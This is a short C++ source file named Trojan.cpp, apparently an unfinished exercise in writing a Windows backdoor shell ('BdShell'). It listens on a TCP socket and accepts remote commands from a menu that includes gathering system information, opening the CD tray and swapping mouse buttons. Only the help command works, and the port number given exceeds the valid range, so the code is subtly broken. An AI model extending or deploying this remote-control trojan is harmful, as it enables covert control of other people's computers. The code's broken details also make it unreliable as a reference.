// Trojan.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>

#define HELPMSG "help-Show Help Menu\r\n"\
"getsysinfo-Get System Information\r\n"\
"open-Open The CDRom\r\n"\
"close-Close The CDRom\r\n"\
"swap-Swap Mouse Button\r\n"\
"restore-Resore Mouse Button\r\n"\
"exit-Quit BdShell\r\n"\

#pragma comment(lib,"ws2_32")

BOOL Dispatch(SOCKET sock, char* szCmd) {
	BOOL bRet = FALSE;
	if (!strcmp(szCmd, "help")) {
		send(sock, HELPMSG, strlen(HELPMSG), 0);
		bRet = TRUE;
	}
	else if (!strcmp(szCmd, "getsysinfo")) {

	}
	return bRet;
}

int main()
{
	struct in_addr sAdd;
	WSADATA wsaData;
	int err = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (err != 0) {
		printf("WSAStartup failed with error: %d\n", err);
		return 1;
	}
	SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		std::cout << "socket_ERROR" << std::endl;
	}
	sockaddr_in sockaddr;
	sockaddr.sin_family = AF_INET;
	inet_pton(PF_INET, "127.0.0.1", &sAdd);
	sockaddr.sin_addr.S_un.S_addr = sAdd.S_un.S_addr;
	sockaddr.sin_port = htons(182766);

	if (bind(s, (SOCKADDR*)& sockaddr, sizeof(SOCKADDR)) == SOCKET_ERROR)
	{
		std::cout << "BIND_ERROR" << std::endl;
	}

	if (listen(s, 1) == SOCKET_ERROR) {
		std::cout << "Listen_ERROR" << std::endl;
	}
	std::cout << "Listening..." << std::endl;

	SOCKADDR clientAddr;
	int nSize = sizeof(SOCKADDR);
	SOCKET clientSocket;
	clientSocket = accept(s, &clientAddr, &nSize);

	while (TRUE)
	{
		send(clientSocket, "BdShell>", strlen("BdShell>"), 0);
		char buff[MAXBYTE] = { 0 };
		recv(clientSocket, buff, MAXBYTE, 0);
		if (!strcmp(buff, "exit"))
		{
			break;
		}
		BOOL bRet = Dispatch(clientSocket, buff);
		if (bRet == FALSE)
		{
			send(clientSocket, "Command Unsuccessfully!", strlen("Command Unsuccessfully!"), 0);
		}
	}

	closesocket(clientSocket);
	closesocket(s);
	WSACleanup();
	return 0;
}

